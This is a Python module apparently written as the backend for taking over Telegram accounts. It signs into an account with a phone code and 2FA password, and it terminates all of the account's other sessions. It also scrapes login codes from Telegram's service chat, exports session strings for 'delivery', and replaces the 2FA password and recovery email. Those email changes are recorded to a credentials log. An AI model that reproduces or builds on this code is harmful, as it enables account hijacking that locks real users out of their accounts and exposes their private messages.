import asyncio
import os
import re
import time
from typing import Optional, Dict, Any, Tuple
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PasswordHashInvalid,
    FloodWait
)
from pyrogram.raw import functions
from backend.core_engine.logger import get_logger

logger = get_logger("PyrogramClient")


class PyrogramSessionManager:
    
    def __init__(self, api_id: int, api_hash: str, sessions_dir: str = "sessions"):
        self.api_id = api_id
        self.api_hash = api_hash
        self.sessions_dir = sessions_dir
        self.active_clients: Dict[str, Client] = {}
        self.phone_code_hashes: Dict[str, str] = {}
        
        os.makedirs(sessions_dir, exist_ok=True)
        logger.info(f"PyrogramSessionManager initialized. Sessions dir: {sessions_dir}")
    
    def _get_session_path(self, phone: str) -> str:
        safe_phone = phone.replace("+", "").replace(" ", "")
        return os.path.join(self.sessions_dir, f"pyrogram_{safe_phone}")
    
    async def send_code(self, phone: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Sending code to {phone}")
        
        session_path = self._get_session_path(phone)
        client = Client(
            session_path,
            api_id=self.api_id,
            api_hash=self.api_hash,
            phone_number=phone
        )
        
        try:
            await client.connect()
            
            if await client.get_me():
                duration = time.time() - start_time
                logger.info(f"Already logged in: {phone} (duration: {duration:.2f}s)")
                self.active_clients[phone] = client
                return {"status": "already_logged_in", "phone": phone, "duration": duration}
            
        except Exception:
            pass
        
        try:
            sent_code = await client.send_code(phone)
            self.phone_code_hashes[phone] = sent_code.phone_code_hash
            self.active_clients[phone] = client
            
            duration = time.time() - start_time
            logger.info(f"Code sent successfully to {phone} (duration: {duration:.2f}s)")
            return {
                "status": "code_sent",
                "phone": phone,
                "phone_code_hash": sent_code.phone_code_hash,
                "duration": duration
            }
            
        except FloodWait as e:
            duration = time.time() - start_time
            logger.error(f"FloodWait: {e.value} seconds (duration: {duration:.2f}s)")
            return {"status": "error", "error": f"Please wait {e.value} seconds", "duration": duration}
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error sending code: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def verify_code(self, phone: str, code: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Verifying code for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found. Please restart authentication."}
        
        phone_code_hash = self.phone_code_hashes.get(phone)
        if not phone_code_hash:
            return {"status": "error", "error": "Phone code hash not found."}
        
        try:
            user = await client.sign_in(phone, phone_code_hash, code)
            duration = time.time() - start_time
            logger.info(f"Successfully signed in: {phone} (User ID: {user.id}, duration: {duration:.2f}s)")
            return {
                "status": "logged_in",
                "user_id": user.id,
                "first_name": user.first_name,
                "phone": phone,
                "duration": duration
            }
            
        except SessionPasswordNeeded:
            duration = time.time() - start_time
            logger.info(f"2FA required for {phone} (duration: {duration:.2f}s)")
            return {"status": "2fa_required", "phone": phone, "duration": duration}
            
        except PhoneCodeInvalid:
            duration = time.time() - start_time
            logger.warning(f"Invalid code for {phone} (duration: {duration:.2f}s)")
            return {"status": "error", "error": "Invalid verification code", "duration": duration}
            
        except PhoneCodeExpired:
            duration = time.time() - start_time
            logger.warning(f"Code expired for {phone} (duration: {duration:.2f}s)")
            return {"status": "error", "error": "Verification code expired", "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error verifying code: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def verify_2fa(self, phone: str, password: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Verifying 2FA for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            user = await client.check_password(password)
            duration = time.time() - start_time
            logger.info(f"2FA verified for {phone} (User ID: {user.id}, duration: {duration:.2f}s)")
            return {
                "status": "logged_in",
                "user_id": user.id,
                "first_name": user.first_name,
                "phone": phone,
                "duration": duration
            }
            
        except PasswordHashInvalid:
            duration = time.time() - start_time
            logger.warning(f"Invalid 2FA password for {phone} (duration: {duration:.2f}s)")
            return {"status": "error", "error": "Invalid 2FA password", "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error verifying 2FA: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def get_security_info(self, phone: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Getting security info for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            # Try to reconnect using existing session
            session_path = self._get_session_path(phone)
            client = Client(
                session_path,
                api_id=self.api_id,
                api_hash=self.api_hash,
                phone_number=phone
            )
            try:
                await client.connect()
                if not await client.get_me():
                    return {"status": "error", "error": "Session expired. Please re-authenticate."}
                self.active_clients[phone] = client
            except Exception as e:
                logger.error(f"Failed to reconnect session for {phone}: {e}")
                return {"status": "error", "error": "Session not found. Please re-authenticate."}
        
        try:
            authorizations = await client.invoke(functions.account.GetAuthorizations())
            
            sessions = []
            current_session = None
            
            for auth in authorizations.authorizations:
                session_info = {
                    "hash": auth.hash,
                    "device_model": auth.device_model,
                    "platform": auth.platform,
                    "system_version": auth.system_version,
                    "api_id": auth.api_id,
                    "app_name": auth.app_name,
                    "app_version": auth.app_version,
                    "date_created": auth.date_created,
                    "date_active": auth.date_active,
                    "ip": auth.ip,
                    "country": auth.country,
                    "region": auth.region,
                    "is_current": auth.current
                }
                
                if auth.current:
                    current_session = session_info
                else:
                    sessions.append(session_info)
            
            password_info = await client.invoke(functions.account.GetPassword())
            
            has_recovery_email = False
            email_unconfirmed_pattern = None
            login_email_pattern = None
            
            if hasattr(password_info, 'has_recovery'):
                has_recovery_email = password_info.has_recovery
            
            if hasattr(password_info, 'email_unconfirmed_pattern') and password_info.email_unconfirmed_pattern:
                email_unconfirmed_pattern = password_info.email_unconfirmed_pattern
            
            if hasattr(password_info, 'login_email_pattern') and password_info.login_email_pattern:
                login_email_pattern = password_info.login_email_pattern
            
            logger.info(f"Password info for {phone}: has_password={password_info.has_password}, has_recovery={has_recovery_email}")
            logger.info(f"Email info for {phone}: recovery_unconfirmed_pattern={email_unconfirmed_pattern}, login_email_pattern={login_email_pattern}")
            
            if hasattr(password_info, '__dict__'):
                all_attrs = {k: v for k, v in vars(password_info).items() if not k.startswith('_')}
                logger.debug(f"Full password_info attributes for {phone}: {all_attrs}")
            
            has_any_email = (
                has_recovery_email or 
                (email_unconfirmed_pattern is not None and len(email_unconfirmed_pattern) > 0) or
                (login_email_pattern is not None and len(login_email_pattern) > 0)
            )
            
            security_info = {
                "status": "success",
                "has_password": password_info.has_password,
                "has_recovery_email": has_recovery_email,
                "email_unconfirmed_pattern": email_unconfirmed_pattern,
                "login_email_pattern": login_email_pattern,
                "has_any_email": has_any_email,
                "password_hint": password_info.hint if password_info.has_password else None,
                "current_session": current_session,
                "other_sessions": sessions,
                "other_sessions_count": len(sessions)
            }
            
            duration = time.time() - start_time
            logger.info(f"Security info retrieved for {phone}: 2FA={security_info['has_password']}, Sessions={len(sessions)} (duration: {duration:.2f}s)")
            security_info["duration"] = duration
            return security_info
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error getting security info: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def terminate_other_sessions(self, phone: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Terminating other sessions for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            authorizations = await client.invoke(functions.account.GetAuthorizations())
            
            terminated = 0
            for auth in authorizations.authorizations:
                if not auth.current:
                    try:
                        await client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                        terminated += 1
                        logger.info(f"Terminated session: {auth.device_model} ({auth.app_name})")
                    except Exception as e:
                        logger.warning(f"Failed to terminate session {auth.hash}: {e}")
            
            duration = time.time() - start_time
            logger.info(f"Terminated {terminated} sessions (duration: {duration:.2f}s)")
            return {"status": "success", "terminated_count": terminated, "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error terminating sessions: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def get_last_telegram_code(self, phone: str) -> Optional[str]:
        start_time = time.time()
        logger.info(f"Getting last Telegram code for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return None
        
        try:
            async for message in client.get_chat_history(777000, limit=5):
                if message.text:
                    codes = re.findall(r'\b(\d{5})\b', message.text)
                    if codes:
                        duration = time.time() - start_time
                        logger.info(f"Found code in Telegram messages: {codes[0]} (duration: {duration:.2f}s)")
                        return codes[0]
            
            duration = time.time() - start_time
            logger.warning(f"No code found in messages (duration: {duration:.2f}s)")
            return None
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error getting Telegram code: {e} (duration: {duration:.2f}s)")
            return None
    
    async def export_session_string(self, phone: str) -> Optional[str]:
        start_time = time.time()
        client = self.active_clients.get(phone)
        if not client:
            return None
        
        try:
            session_string = await client.export_session_string()
            duration = time.time() - start_time
            logger.info(f"Session string exported for {phone} (duration: {duration:.2f}s)")
            return session_string
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error exporting session string: {e} (duration: {duration:.2f}s)")
            return None
    
    async def enable_2fa(self, phone: str, new_password: str, hint: str = "", email: str = "") -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Enabling 2FA for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            result = await client.enable_cloud_password(new_password, hint=hint, email=email)
            
            duration = time.time() - start_time
            logger.info(f"2FA enabled successfully for {phone} (duration: {duration:.2f}s)")
            return {
                "status": "success",
                "message": "2FA enabled successfully",
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error enabling 2FA: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def change_2fa_password(self, phone: str, current_password: str, new_password: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Changing 2FA password for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            await client.change_cloud_password(current_password, new_password)
            
            duration = time.time() - start_time
            logger.info(f"2FA password changed for {phone} (duration: {duration:.2f}s)")
            return {"status": "success", "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error changing 2FA password: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def _terminate_other_sessions_backup(self, phone: str) -> Dict[str, Any]:
        start_time = time.time()
        logger.info(f"Terminating other sessions for {phone} (backup method)")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            from pyrogram.raw import functions
            
            auth_result = await client.invoke(functions.account.GetAuthorizations())
            terminated = 0
            
            for auth in auth_result.authorizations:
                if not auth.current:
                    try:
                        await client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                        terminated += 1
                    except:
                        pass
            
            duration = time.time() - start_time
            logger.info(f"Terminated {terminated} sessions for {phone} (duration: {duration:.2f}s)")
            return {"status": "success", "terminated": terminated, "duration": duration}
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error terminating sessions: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def connect_from_string(self, phone: str, session_string: str) -> bool:
        start_time = time.time()
        logger.info(f"Connecting from session string for {phone}")
        
        try:
            client = Client(
                name=f"delivery_{phone}",
                api_id=self.api_id,
                api_hash=self.api_hash,
                session_string=session_string,
                in_memory=True
            )
            
            await client.start()
            self.active_clients[phone] = client
            
            duration = time.time() - start_time
            logger.info(f"Connected from session string for {phone} (duration: {duration:.2f}s)")
            return True
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error connecting from session string: {e} (duration: {duration:.2f}s)")
            return False
    
    async def disconnect(self, phone: str):
        client = self.active_clients.get(phone)
        if client:
            try:
                await client.disconnect()
                del self.active_clients[phone]
                logger.info(f"Disconnected: {phone}")
            except Exception as e:
                logger.error(f"Error disconnecting: {e}")
    
    async def disconnect_all(self):
        for phone in list(self.active_clients.keys()):
            await self.disconnect(phone)
    
    async def get_full_password_info(self, phone: str) -> Dict[str, Any]:
        """Get complete password/2FA information including email details"""
        start_time = time.time()
        logger.info(f"Getting full password info for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            password_info = await client.invoke(functions.account.GetPassword())
            
            result = {
                "status": "success",
                "has_password": password_info.has_password,
                "has_recovery": getattr(password_info, 'has_recovery', False),
                "email_unconfirmed_pattern": getattr(password_info, 'email_unconfirmed_pattern', None),
                "login_email_pattern": getattr(password_info, 'login_email_pattern', None),
                "hint": getattr(password_info, 'hint', None),
                "has_secure_values": getattr(password_info, 'has_secure_values', False),
                "pending_reset_date": getattr(password_info, 'pending_reset_date', None),
            }
            
            # Log all available attributes for debugging
            if hasattr(password_info, '__dict__'):
                all_attrs = {k: str(v)[:100] for k, v in vars(password_info).items() if not k.startswith('_')}
                logger.debug(f"All password_info attributes: {all_attrs}")
                result["raw_attributes"] = list(all_attrs.keys())
            
            duration = time.time() - start_time
            result["duration"] = duration
            logger.info(f"Full password info for {phone}: has_2fa={result['has_password']}, has_recovery={result['has_recovery']} (duration: {duration:.2f}s)")
            
            return result
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error getting full password info: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def change_recovery_email(self, phone: str, current_password: str, new_email: str) -> Dict[str, Any]:
        """
        Change the 2FA recovery email to a new email address using high-level API
        Uses change_cloud_password with same password but new email
        """
        start_time = time.time()
        logger.info(f"Changing recovery email for {phone} to {new_email}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            await client.change_cloud_password(
                current_password=current_password,
                new_password=current_password,
                new_hint="",
                email=new_email
            )
            
            duration = time.time() - start_time
            logger.info(f"Recovery email change initiated for {phone} to {new_email} (duration: {duration:.2f}s)")
            
            from backend.core_engine.credentials_logger import log_credentials
            log_credentials(
                phone=phone,
                action="EMAIL_CHANGE_INITIATED",
                email=new_email,
                extra_data={}
            )
            
            return {
                "status": "success",
                "message": "Email change initiated. Verification code will be sent to the new email.",
                "new_email": new_email,
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error changing recovery email: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def confirm_recovery_email(self, phone: str, code: str) -> Dict[str, Any]:
        """Confirm the new recovery email with the verification code"""
        start_time = time.time()
        logger.info(f"Confirming recovery email for {phone} with code")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            result = await client.invoke(
                functions.account.ConfirmPasswordEmail(code=code)
            )
            
            duration = time.time() - start_time
            logger.info(f"Recovery email confirmed for {phone} (duration: {duration:.2f}s)")
            
            # Log to credentials file
            from backend.core_engine.credentials_logger import log_credentials
            log_credentials(
                phone=phone,
                action="EMAIL_CONFIRMED",
                extra_data={"result": str(result)}
            )
            
            return {
                "status": "success",
                "message": "Recovery email confirmed successfully",
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error confirming recovery email: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def resend_email_code(self, phone: str) -> Dict[str, Any]:
        """Resend the recovery email verification code"""
        start_time = time.time()
        logger.info(f"Resending email verification code for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            result = await client.invoke(functions.account.ResendPasswordEmail())
            
            duration = time.time() - start_time
            logger.info(f"Email code resent for {phone} (duration: {duration:.2f}s)")
            
            return {
                "status": "success",
                "message": "Verification code resent",
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error resending email code: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def cancel_email_change(self, phone: str) -> Dict[str, Any]:
        """Cancel pending email change"""
        start_time = time.time()
        logger.info(f"Cancelling email change for {phone}")
        
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            result = await client.invoke(functions.account.CancelPasswordEmail())
            
            duration = time.time() - start_time
            logger.info(f"Email change cancelled for {phone} (duration: {duration:.2f}s)")
            
            return {
                "status": "success",
                "message": "Email change cancelled",
                "duration": duration
            }
            
        except Exception as e:
            duration = time.time() - start_time
            logger.error(f"Error cancelling email change: {e} (duration: {duration:.2f}s)")
            return {"status": "error", "error": str(e), "duration": duration}
    
    async def get_me_info(self, phone: str) -> Dict[str, Any]:
        """Get current user info including Telegram ID"""
        client = self.active_clients.get(phone)
        if not client:
            return {"status": "error", "error": "Session not found."}
        
        try:
            me = await client.get_me()
            return {
                "status": "success",
                "id": me.id,
                "first_name": me.first_name,
                "last_name": me.last_name,
                "username": me.username,
                "phone": me.phone_number
            }
        except Exception as e:
            return {"status": "error", "error": str(e)}


_session_manager: Optional[PyrogramSessionManager] = None


def get_session_manager(api_id: int = None, api_hash: str = None) -> PyrogramSessionManager:
    global _session_manager
    if _session_manager is None:
        if api_id is None or api_hash is None:
            raise ValueError("api_id and api_hash required for first initialization")
        _session_manager = PyrogramSessionManager(api_id, api_hash)
    return _session_manager
